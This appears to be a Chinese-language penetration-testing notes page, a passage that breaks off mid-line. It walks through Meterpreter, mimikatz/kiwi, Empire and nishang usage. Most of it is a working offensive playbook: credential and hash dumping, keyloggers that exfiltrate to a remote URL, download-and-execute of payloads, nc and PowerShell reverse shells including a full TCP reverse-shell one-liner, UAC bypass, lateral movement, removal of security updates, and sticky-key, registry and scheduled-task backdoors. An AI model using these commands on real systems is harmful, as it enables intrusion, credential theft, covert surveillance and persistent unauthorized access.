<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">//列出可用的Token</span><br><span class="line">list_tokens -u</span><br><span class="line">/*例：</span><br><span class="line"> *meterpreter &gt; list_tokens -u</span><br><span class="line"> *</span><br><span class="line"> *Delegation Tokens Available   //授权令牌，可交互式登陆（<span class="number">3389</span>远程登陆等）</span><br><span class="line"> *========================================</span><br><span class="line"> *NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> *NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> *NT AUTHORITY\SYSTEM</span><br><span class="line"> *ROOT\xuegod_root</span><br><span class="line"> *</span><br><span class="line"> *Impersonation Tokens Available    //模拟令牌，非交互式会话</span><br><span class="line"> *========================================</span><br><span class="line"> *NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"> */</span><br><span class="line">//切换到ROOT\xuegod_root用户，输入命令是双斜杠</span><br><span class="line">impersonate_token ROOT\\xuegod_root</span><br></pre></td></tr></table></figure>

<p>Hash：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">//导出SAM</span><br><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run windows/gather/smart_hashdump  //更好，可以导出域用户hash</span><br></pre></td></tr></table></figure>

<p>PwDump:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">可以导出几乎所有HASH和登陆记录</span><br><span class="line">-dhl 导出本地哈希值</span><br><span class="line">-dhdc 导出域控哈希值</span><br><span class="line">-dhd  导出域控哈希值，需要指定NTDS文件</span><br><span class="line">-db  导出Bitlocker信息，需要指定NTDS文件</span><br><span class="line">-nt  导出NTDS文件</span><br><span class="line">-hist  导出历史信息</span><br><span class="line">-t  可选导出类型  默认John</span><br><span class="line">-o  导出文件到本地</span><br></pre></td></tr></table></figure>

<p>kiwi     mimikatz的替换工具</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line">Command                Description</span><br><span class="line">-------                -----------</span><br><span class="line">creds_all              #列举所有凭据/所有的系统密码</span><br><span class="line">creds_kerberos         #列举所有kerberos凭据</span><br><span class="line">creds_msv              #列举所有msv凭据</span><br><span class="line">creds_ssp              #列举所有ssp凭据</span><br><span class="line">creds_tspkg            #列举所有tspkg凭据</span><br><span class="line">creds_wdigest          #列举所有wdigest凭据</span><br><span class="line">dcsync                 #通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm            #通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create   #创建黄金票据</span><br><span class="line">kerberos_ticket_list   #列举kerberos票据</span><br><span class="line">kerberos_ticket_purge  #清除kerberos票据</span><br><span class="line">kerberos_ticket_use    #使用kerberos票据</span><br><span class="line">kiwi_cmd               #kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令</span><br><span class="line">lsa_dump_sam           #dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets       #dump出lsa的密文</span><br><span class="line">password_change        #修改密码</span><br><span class="line">wifi_list              #列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared       #列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure>



<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>Cymothoa</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Cymothoa可以将shellcode注入现有进程，宿主进程被杀，后门也会被杀。生成后门需要在目标主机上执行。</span><br><span class="line">cymothoa -p <span class="number">982</span> -s <span class="number">1</span> -y <span class="number">4444</span></span><br><span class="line">-p表示注入的宿主进程pid</span><br><span class="line">-s表示shellcode类型，可以使用cymothoa -s查看</span><br><span class="line">-y表示端口</span><br><span class="line">成功后就可以使用nc -nvv ip <span class="number">4444</span>连接目标主机后门</span><br></pre></td></tr></table></figure>

<p>Persistence</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">persistence是安装自启动方式的持续性后门。</span><br><span class="line">在msf中输入 run persistence -h 查看所有命令选项</span><br><span class="line">使用：</span><br><span class="line">run persistence -A -S -U -i <span class="number">60</span> -p <span class="number">4444</span> -r <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">A：自动启动payload程序</span><br><span class="line">S：系统启动时自动加载</span><br><span class="line">U：用户登陆时自动启动</span><br><span class="line">X：开机时自动加载</span><br><span class="line">i：回连的时间间隔</span><br><span class="line">P：反向连接的端口号（vps端口）</span><br><span class="line">r：反向连接的IP地址（VPS地址）</span><br></pre></td></tr></table></figure>





<h1 id="empire"><a href="#empire" class="headerlink" title="empire"></a>empire</h1><p>empire是基于linux平台的针对windows系统的，使用powershell脚本作为攻击载荷的渗透框架工具。内置键盘记录、猕猴桃、绕过UAC、内网扫描等等。并且能够躲避网络检测和大部分安全防护工具查杀。</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下载安装</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/EmpireProject/Empire.git</span><br><span class="line">进入setup目录 执行install.sh  (TXvps密码设置的pero) </span><br><span class="line">//pefile最新版本不支持python2.7了,所以安装该模块时需要选择正确版本</span><br><span class="line">//pip install pefile==2019.4.18</span><br><span class="line">安装完成在Empire目录执行empire即可</span><br><span class="line"></span><br><span class="line">基本命令</span><br><span class="line"><span class="built_in">help</span>   查看帮助</span><br><span class="line">listeners</span><br><span class="line">uselistener http 作用同msf的payload，设置http监听器</span><br><span class="line">//输入uselistener 后双击tab可以查看可设置的监听器类型。uselistener后有空格</span><br><span class="line">//总共7种模式：dbx  http   http_com  http_foreign  http_hop  http_mapi  meterpreter</span><br><span class="line">info  查看具体参数设置</span><br><span class="line"><span class="built_in">set</span> Name http_8001</span><br><span class="line"><span class="built_in">set</span> Host 192.168.168.168:8008</span><br><span class="line"><span class="built_in">set</span> Port 8008</span><br><span class="line">execute  开始监听</span><br><span class="line">back   返回上层</span><br><span class="line">list  列出当前激活的监听和会话</span><br><span class="line"><span class="built_in">kill</span> http_8001  删除监听</span><br><span class="line">usestager  windows/dll  设置dll木马</span><br><span class="line"><span class="built_in">set</span> listener http_8001  选择监听器</span><br><span class="line">execute  生成木马</span><br><span class="line"></span><br><span class="line">如果只需要powershell代码，在设置监听器后进入listeners后，输入launcher &lt;language&gt; &lt;listenerName&gt;</span><br><span class="line">如launcher powershell http_8001</span><br><span class="line">agents  查看上线的目标主机  同msf的sessions，红色为掉线主机，绿色为在线主机，橙色介于两者之间，dddd</span><br><span class="line">remove stale 删除失去连接的主机</span><br><span class="line">rename xxxxx  mdu   重命名会话名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interact mdu  进入mdu会话   //empire支持windows，linux和msf的常用命令，可直接使用，<span class="built_in">help</span> agentcmds可以查看支持的常用命令</span><br><span class="line">部分cmd命令需要采用 shell + 命令执行</span><br><span class="line">如：shell net view</span><br><span class="line">mimikatz   抓取密码，抓取后可使用creds过滤，creds有可选参数，可双击tab查看</span><br><span class="line">creds <span class="built_in">export</span> xx.csv  导出抓取的凭证</span><br><span class="line"></span><br><span class="line">usemodule collection/screenshot   调用截屏模块</span><br><span class="line">usemodule collection/keylogger   键盘记录，执行后会起一个job，记录的内容在Empire/download/mdu/agent.log和keystrokes.txt中</span><br><span class="line">usemodule collection/clipboard_monitor   剪切板记录，其同键盘记录一样会起一个job</span><br><span class="line">execute   执行，执行后back即可返回会话</span><br><span class="line"><span class="built_in">jobs</span>  查看当前后台任务名称</span><br><span class="line"><span class="built_in">jobs</span> <span class="built_in">kill</span> JobName  杀死后台JobName任务    如：<span class="built_in">jobs</span> <span class="built_in">kill</span> 2L1ZEX</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\CITAD\c$</span><br><span class="line"></span><br><span class="line">usemodule situational_awareness/network/powerview/share_finder  用于查找所有域内共享文件夹</span><br><span class="line">usemodule situational_awareness/host/winenum   用于查看本机用户，域组成员，剪切板内容等等</span><br><span class="line">usemodule situational_awareness/host/computerdetails   用于查看几乎本机所有的有用信息</span><br><span class="line"></span><br><span class="line">usemodule situational_awareness/network/arpscan   用于arp扫描</span><br><span class="line"><span class="built_in">set</span> Range 192.168.1.0-192.168.1.100</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">usemodule situational_awareness/network/reverse_dns  用于查看hostname和ip地址的对应关系</span><br><span class="line">usemodule situational_awareness/host/dnsserver   用于查看dns服务器ip</span><br><span class="line">usemodule situational_awareness/network/powerview/user_hunter  用于查看域内用户登陆了域内的哪台机器</span><br><span class="line">usemodule situational_awareness/network/powerview/find_localadmin_access 用于本地管理组的查看</span><br><span class="line">usemodule situational_awareness/network/powerview/get_domain_controller  用于确定域控(需要域用户或者本地管理员权限)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、Bypass UAC</span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line"><span class="built_in">set</span> Listener http_8001  设置提权成功后接收反弹shell的监听器</span><br><span class="line">execute  </span><br><span class="line">攻击成功后会上线一个新的连接</span><br><span class="line">回到agents，查看已连接的主机，会看见一个带星号的主机，表示已提权</span><br><span class="line"></span><br><span class="line">2、bypassuac_wscript</span><br><span class="line">利用C:\Windows\wscript.exe执行payload，即如果UAC实现管理员权限执行payload，只适用于windows7系统，目前无补丁，但是部分杀软有提示。</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line">execute</span><br><span class="line">执行后效果同bypass uac</span><br><span class="line"></span><br><span class="line">3、PowerUp</span><br><span class="line">Empire内置PowerUp部分工具，共8种提权方式。P322</span><br><span class="line">usemodule privesc/powerup    双击tab查看完整利用工具</span><br><span class="line">使用allcheck查找系统中的漏洞</span><br><span class="line">usemodule privesc/powerup/allchecks</span><br><span class="line">execute</span><br><span class="line">根据结果进行提权，如：使用bypassuac</span><br><span class="line">bypassuac <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">4、GPP</span><br><span class="line">在域里常常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP采用AES256加密。</span><br><span class="line">usemodule privesc/gpp</span><br><span class="line">info</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、令牌窃取</span><br><span class="line">使用mimikatz获取系统密码，输入creds查看Empire列举的密码</span><br><span class="line">假设获取到了一系列账号信息，如：</span><br><span class="line">credID    CredType  Domain   UserName        Host   Password</span><br><span class="line">1         <span class="built_in">hash</span>      <span class="built_in">test</span>     Administartor   win7   xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">pth 1 //盗取credID为1，即Administartor账号，成功后就会变成<span class="built_in">test</span>域Administrator账号权限</span><br><span class="line">steal_token 1380 //窃取进程号为1380的进程，如果该进程是域内管理员用户创建，则窃取后就变成域内管理员权限。可使用ps查看所有进程</span><br><span class="line">窃取后测试是否可访问域内其他主机，如：</span><br><span class="line">shell <span class="built_in">dir</span> \\WIN7-1\c$</span><br><span class="line">revtoself   恢复令牌为原来的状态</span><br><span class="line"></span><br><span class="line">2、会话注入</span><br><span class="line">usemodule management/psinject</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line"><span class="built_in">set</span> ProcID 1380    注入进程的进程号</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">3、Invoke-PsExec</span><br><span class="line">Invoke-PsExec会被大部分杀毒软件检测到并记录下来，而且需要开启445端口共享。其优点是直接返回system权限。</span><br><span class="line">使用时至少需要本地管理员权限。</span><br><span class="line">usemodule lateral_movement/invoke_psexec</span><br><span class="line">info</span><br><span class="line"><span class="built_in">set</span> ComputerName WIN7-1.<span class="built_in">test</span>    设置机器名(机器名需要完整名称，包括域名)</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">4、Invoke-WMi</span><br><span class="line">其比PsExec要安全，所有的windows都启用了该服务。当使用wmiexec进行攻击时，windows系统默认不会在日志中记录该操作，同时攻击时无需文件落地，具有较高隐蔽性。但是目标开启了防火墙，用WMI将无法连接上目标机器。</span><br><span class="line">usemodule lateral_movement/invoke_wmi</span><br><span class="line"><span class="built_in">set</span> ComputerName WIN7-1.<span class="built_in">test</span>    设置机器名(机器名需要完整名称，包括域名)</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line">execute</span><br><span class="line">//**</span><br><span class="line">WMI还可以使用lateral_movement/invoke_wmi_debugger,其使用WMI设置5个Windows Accessibility可执行文件中的任意一个调试器。</span><br><span class="line">sethc.exe  粘滞键，按五下<span class="built_in">shift</span>触发</span><br><span class="line">narrator.exe  文本转语音，可使用Utilman接口激活</span><br><span class="line">Utilman.exe   Windows辅助管理器，按win+U即可启用</span><br><span class="line">Osk.exe  虚拟键盘，可使用Utilman接口激活</span><br><span class="line">Magnify.exe  放大镜，可利用Utilman接口启用</span><br><span class="line"></span><br><span class="line">5、PowerShell Remoting</span><br><span class="line">PowerShell Remoting是PowerShell的远程管理功能，开启Windows远程管理服务WinRM系统后会监听5985端口，该服务在Sever2012中默认开启，在Server 2003/2008/2008 R2中需要手动开启。</span><br><span class="line">如果目标启用了该服务，或者拥有启用该服务的权限的凭据，就可以使用以下方法进行横向渗透。</span><br><span class="line">usemodule lateral_movement/invoke_psremoting</span><br><span class="line"><span class="built_in">set</span> ComputerName WIN7-1.<span class="built_in">test</span>    设置机器名(机器名需要完整名称，包括域名)</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="后门-1"><a href="#后门-1" class="headerlink" title="后门"></a>后门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、粘滞键后门</span><br><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line"><span class="built_in">set</span> ComputerName WIN7.<span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> TargetBinary sethc.exe</span><br><span class="line">execute</span><br><span class="line">设置完成后，在目标主机连按5次<span class="built_in">shift</span>，会有cmd窗口一闪而过，然后就会反弹回一个shell</span><br><span class="line"></span><br><span class="line">除了sethc.exe,还可以设置成其他程序。</span><br><span class="line">Utilman.exe   osk.exe   Narrator.exe   Magnify.exe</span><br><span class="line"></span><br><span class="line">2、注册表注入后门</span><br><span class="line">usemodule persistence/userland/registry</span><br><span class="line"><span class="built_in">set</span> Listener http_8001</span><br><span class="line"><span class="built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">execute</span><br><span class="line">当用户登陆系统时，就会反弹shell</span><br><span class="line"></span><br><span class="line">3、计划任务后门</span><br><span class="line"> usemodule persitence/elevated/schtasks</span><br><span class="line"> <span class="built_in">set</span> DailyTime 16:30</span><br><span class="line"> <span class="built_in">set</span> Listener http_8001</span><br><span class="line"> execute</span><br><span class="line"> 当目标机器时间到达16:30时，会反弹一个shell。但是其免杀效果不好，绝大多数杀软都会有提示。</span><br><span class="line"> 如果将RegPath设置成HKCU:Software\Microsoft\Windows\CurrentVersion\Run，就会在16:30添加一个注册表后门。</span><br></pre></td></tr></table></figure>

<h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf设置监听器：</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_https</span><br><span class="line"><span class="built_in">set</span> Lhost 192.168.168.168</span><br><span class="line"><span class="built_in">set</span> Lport 4444</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">Empire的会话中反弹msf会话：</span><br><span class="line">usemodule code_execution/invoke_shellCode</span><br><span class="line"><span class="built_in">set</span> Lhost 192.168.168.168</span><br><span class="line"><span class="built_in">set</span> Lport 4444     </span><br><span class="line">execute</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h1><p>nishang是一款PowerShell渗透工具。</p>
<p>下载地址: github.com/samratashok/nishang</p>
<p>其运行环境要求为PowerShell3.0以上，因此在windows7以下运行存在小问题，因为windows7环境为PowerShell2.0</p>
<h2 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h2><p>在目标机中导入模块后即可使用</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">导入nishang：</span><br><span class="line"><span class="built_in">Import-Module</span> .\nishang.psm1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> nishang   查看nishang所有模块</span><br><span class="line"><span class="built_in">Get-Information</span>      查看机器中的几乎所有基本信息</span><br><span class="line"><span class="built_in">Get-Information</span> | <span class="built_in">Out-File</span> res.txt   查看机器中的几乎所有基本信息并保存成文件</span><br><span class="line">Check<span class="literal">-VM</span>   检测是否为虚拟机</span><br><span class="line"><span class="built_in">Invoke-CredentialsPhish</span>     构造虚假密码验证弹窗，只有输入正确用户和密码才可通过验证，以此获取密码</span><br><span class="line"><span class="built_in">Copy-VSS</span>   利用Volume Shadow <span class="built_in">Copy</span>复制sam文件，在域控上运行则也会把ntds.dit和SYSTEM hive拷贝出来，保存至当前目录</span><br><span class="line"><span class="built_in">Copy-VSS</span> <span class="literal">-DestinationDir</span> C:temp  保存至temp目录</span><br><span class="line"></span><br><span class="line">Keylogger 键盘记录   </span><br><span class="line">四种运行模式：</span><br><span class="line">\Keylogger.ps1   键盘记录会保存在当前用户Temp目录下的key文件中</span><br><span class="line">\Keylogger.ps1 <span class="literal">-CheckURL</span> http://gabgm.com/keylogger.php <span class="literal">-MagicString</span> stopkeylogger 检测指定网页中是否包含stopkeylogger，如果存在就停止记录</span><br><span class="line">\Keylogger.ps1 <span class="literal">-CheckURL</span> http://gabgm.com/keylogger.php <span class="literal">-MagicString</span> stopkeylogger <span class="literal">-exfil</span> <span class="literal">-ExfilOption</span> WebServer <span class="literal">-URL</span> http://gabgm.com/keylog.php   将记录通过post指定发送到http://gabgm.com/keylog.php</span><br><span class="line">\Keylogger.ps1 <span class="literal">-persist</span>   持久化记录（重启后依然记录）</span><br><span class="line">（记录文件需要Utility模块中的Parse_Keys解析：Parse_Keys key.log parsed.txt）</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-DumpCerts</span>   导出本机凭证信息</span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-DumpCerts</span> <span class="literal">-ComputerName</span> <span class="selector-tag">@</span>(<span class="string">&quot;computer1&quot;</span>,<span class="string">&quot;computer2&quot;</span>)  导出远程的两台计算机的凭证信息</span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-Command</span> <span class="string">&quot;privilege::debug exit&quot;</span> <span class="literal">-ComputerName</span> <span class="string">&quot;computer1&quot;</span>  在远程的computer1上运行mimikatz并执行“privilege::debug <span class="keyword">exit</span>”</span><br><span class="line"><span class="built_in">Get-PassHashes</span>  在Administrator权限下导出密码hash，来源于msf的power dump模块，但是不需要system权限</span><br><span class="line"><span class="built_in">Get-PassHints</span>   在Administrator权限下读取sam hive，其是用户在登陆界面设置的密码提示信息</span><br><span class="line"></span><br><span class="line">ExetoText c:msf.exe c:msf.txt  将msf木马程序转换为txt文件</span><br><span class="line">Download_Execute http://<span class="number">192.168</span>.<span class="number">168.168</span>/msf.txt  下载并执行该文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">Remove-Update</span> All  移除目标机器上的所有更新</span><br><span class="line"><span class="built_in">Remove-Update</span> Security  移除目标机器上的所有安全更新</span><br><span class="line"><span class="built_in">Remove-Update</span> KB2761226  移除目标机器上指定编号的更新</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Help</span> <span class="built_in">Invoke-PortScan</span><span class="literal">-full</span>   查看端口扫描模块的帮助信息</span><br><span class="line">StartAddress  扫描范围的开始地址</span><br><span class="line">EndAddress   扫描范围的结束地址</span><br><span class="line">SacnPort  进行端口扫描</span><br><span class="line">Port 指定扫描端口，可默认</span><br><span class="line">TimeOut 设置超时时间</span><br><span class="line"><span class="built_in">Invoke-PortScan</span> <span class="literal">-StartAddress</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-EndAddress</span> <span class="number">192.168</span>.<span class="number">1.255</span> <span class="literal">-ResolveHost</span>  搜索主机并解析主机名</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-BruteForce</span> <span class="literal">-ComputerName</span> test.com <span class="literal">-UserList</span> C:testusers.txt <span class="literal">-PasswordList</span> c:testwordlist.txt <span class="literal">-Service</span> ActiveDirectory <span class="literal">-StopOnSuccess</span> <span class="literal">-Verbose</span>  爆破域控制器</span><br><span class="line"><span class="built_in">Invoke-BruteForce</span> <span class="literal">-ComputerName</span> sqlserver <span class="literal">-UserList</span> C:testusers.txt <span class="literal">-PasswordList</span> c:testwordlist.txt <span class="literal">-Service</span> SQL <span class="literal">-Verbose</span>  爆破sql server</span><br><span class="line"><span class="built_in">cat</span> c:sqlservice.txt | <span class="built_in">Invoke-BruteForce</span> <span class="literal">-ComputerName</span> sqlserver <span class="literal">-UserList</span> C:testusers.txt <span class="literal">-PasswordList</span> c:testwordlist.txt <span class="literal">-Service</span> SQL <span class="literal">-Verbose</span>  爆破sqlservice.txt中的sql server </span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Interceptor</span> <span class="literal">-ProxyServer</span> <span class="number">192.168</span>.<span class="number">168.168</span> <span class="literal">-ProxyPort</span> <span class="number">3306</span>  内网嗅探，动静大，不要轻易使用，</span><br><span class="line">vps上监听  nc <span class="literal">-lvvp</span> <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">反向传输屏幕画面：</span><br><span class="line"><span class="built_in">Show-TargetScreen</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">168.168</span> <span class="literal">-Port</span> <span class="number">3306</span> 将目标机屏幕画面传送到vps上</span><br><span class="line">vps上转发： nc <span class="literal">-nlvp</span> <span class="number">3306</span> | nc <span class="literal">-nlvp</span> <span class="number">9999</span></span><br><span class="line">用火狐访问<span class="number">9999</span>端口即可查看实时画面</span><br><span class="line"></span><br><span class="line">正向传输屏幕画面：</span><br><span class="line"><span class="built_in">Show-TargetScreen</span> <span class="literal">-Bind</span> <span class="literal">-Port</span> <span class="number">3306</span></span><br><span class="line">vps执行：nc <span class="literal">-nv</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">3306</span> | nc <span class="literal">-lnvp</span> <span class="number">9999</span></span><br><span class="line">用火狐访问<span class="number">9999</span>端口即可查看实时画面</span><br></pre></td></tr></table></figure>

<p>nishang模块及功能</p>
<p>Antak-WebShell         webshell</p>
<p>Backdoors                   后门</p>
<p>Client                           客户端</p>
<p>Escalation                   提权</p>
<p>Execution                   RCE</p>
<p>Gather                        信息收集</p>
<p>Misc                            杂项</p>
<p>Pivot                            跳板/远程执行EXE</p>
<p>Scan                            扫描</p>
<p>Powerpreter             Meterpreter会话</p>
<h2 id="隐秘通信隧道"><a href="#隐秘通信隧道" class="headerlink" title="隐秘通信隧道"></a>隐秘通信隧道</h2><p>①Invoke-PowerShellTcp是基于TCP协议的PowerShell正反向连接shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、反向连接</span><br><span class="line">vps：nc <span class="literal">-lvp</span> <span class="number">3306</span></span><br><span class="line">目标机：<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">168.168</span> <span class="literal">-Port</span> <span class="number">3306</span> </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、正向连接</span><br><span class="line">目标机：<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Bind</span> <span class="literal">-Port</span> <span class="number">3306</span></span><br><span class="line">vps： nc <span class="literal">-nv</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure>

<p>②Invoke-PowerShellUdp是基于UDP协议的PowerShell正反向连接shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、反向连接</span><br><span class="line">vps：nc -lup 3306</span><br><span class="line">目标机：Invoke-PowerShellUdp -Reverse -IPAddress 192.168.168.168 -Port 3306 </span><br><span class="line"></span><br><span class="line">2、正向连接</span><br><span class="line">目标机：Invoke-PowerShellUdp -Bind -Port 3306</span><br><span class="line">vps： nc -nvu 192.168.1.1 3306</span><br></pre></td></tr></table></figure>

<p>③Invoke-PoshRathttp和Invoke-PoshRathttps是基于http和https协议的反向链接shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、在vps中执行：</span><br><span class="line"><span class="built_in">Invoke-PoshRathttp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">168.168</span> <span class="literal">-Port</span> <span class="number">3306</span></span><br><span class="line"><span class="built_in">Invoke-PoshRathttps</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">168.168</span> <span class="literal">-Port</span> <span class="number">3306</span></span><br><span class="line"><span class="number">2</span>、将生成的powershell命令在目标机中执行即可</span><br></pre></td></tr></table></figure>

<h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>将Antak-WebShell模块下的aspx大马上传到目标网站即可。</p>
<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>UAC：User Account Control 用户账号控制，是微软为提高系统安全，在windows Vista中引入的技术。其分为三个等级。</p>
<p>高等级进程需要管理员权限，中等级进程需要基本用户权限，低级别进程权限受各种限制。</p>
<p>UAC需要授权的操作：</p>
<p>配置Windows update、增加删除用户、更改账户类型、改变UAC设置、安装ActiveX、安装卸载程序、安装驱动、设置家长控制、移动复制Program Files和Windows文件夹、查看其他用户文件夹等等。</p>
<p>UAC有四种设置要求：</p>
<p>始终通知：这是最严格的设置，只要使用高级别权限，都会通知用户。</p>
<p>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。本地windows程序使用高级别权限时，不通知。第三方程序会通知。</p>
<p>仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：同上，只是通知时，不降低桌面亮度。</p>
<p>从不提示：当用户为系统管理员时，所有程序都以最高权限运行。</p>
<p>Invoke-PsUACme模块使用来自UACME项目的DLL来绕过UAC。</p>
<p>nishang中绕过UAC的各种方法：</p>
<p><img src="https://pic2.zhimg.com/80/v2-1d3d9b3b5e74eaca0a84cbdf719f78bf_hd.jpg"></p>
<p>具体使用：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-Verbose</span>  使用Sysprep方法，并执行默认的payload</span><br><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-method</span> oobe <span class="literal">-Verbose</span>   使用oobe方法，并执行默认payload</span><br><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-method</span> oobe <span class="literal">-Payload</span> <span class="string">&quot;power shell-windowstyle hidden -e 加密的payload&quot;</span>  指定payload</span><br><span class="line">也可以使用<span class="literal">-CustomDll64</span>或者<span class="literal">-CustomDll32</span>来指定dll文件</span><br></pre></td></tr></table></figure>

<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>木马生成在Client模块中，包含各种类型的木马，HTA，Word等等。</p>
<p>各个脚本使用方法基本相同。</p>
<p>Payload  后面直接加payload，注意引号闭合</p>
<p>PayloadURL   传入远程Payload进行生成</p>
<p>PayloadScript  指定本地的脚本进行生成</p>
<p>Arguments  后面加上要执行的函数</p>
<p>OutputFile  输出的文件名</p>
<p>WordFileDir  输出的目录地址</p>
<p>Recurse  在wordfiledir中递归寻找word文件</p>
<p>RemoveDocx  创建完成后删除原始文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例：</span><br><span class="line">vps： nc -lvp 3306</span><br><span class="line"></span><br><span class="line">制作word文件，打开Shells模块的Invoke-PowerShellTcpOneLine.ps1</span><br><span class="line">内容如下：</span><br><span class="line">#A simple and small reverse shell. Options and help removed to save space. </span><br><span class="line">#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.</span><br><span class="line">#$client = New-Object System.Net.Sockets.TCPClient(&#x27;192.168.254.1&#x27;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br><span class="line">#$sm=(New-Object 